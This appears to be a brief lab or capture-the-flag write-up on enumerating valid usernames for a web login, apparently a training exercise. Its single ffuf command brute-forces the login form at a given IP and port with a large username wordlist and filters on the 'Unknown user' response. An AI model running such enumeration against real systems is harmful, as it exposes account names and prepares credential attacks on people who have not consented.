# [Enumerating Users](Enumerating%20Users.md)
### Enumerate a valid user on the web application. Provide the username as the answer.

![](Screenshot%202026-09-14%20at%2008.18.56.png)

```sh
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.82:30105/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
![](Screenshot%202026-09-14%20at%2008.24.36.png)